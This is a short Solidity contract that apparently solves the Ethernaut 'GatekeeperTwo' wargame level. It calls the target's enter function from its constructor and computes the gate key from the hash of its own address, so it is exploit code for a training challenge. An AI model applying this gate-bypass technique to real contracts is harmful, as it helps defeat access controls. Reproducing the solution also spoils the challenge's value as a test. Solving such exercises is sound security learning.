// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {GatekeeperTwo} from "./L15__GatekeeperTwo.sol";

contract L15_Caller__GatekeeperTwo {
    GatekeeperTwo public gatekeeperTwo =
        GatekeeperTwo(0x1424D03a3fF4b4F3Df11d182CbDA1CCA608F66cC);
    uint256 myBalance;

    constructor() {
        uint64 _numberThing = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        );

        bytes8 _key = bytes8(type(uint64).max - _numberThing);

        bool _success = gatekeeperTwo.enter(_key);
        require(_success, "enter failed");
    }
}
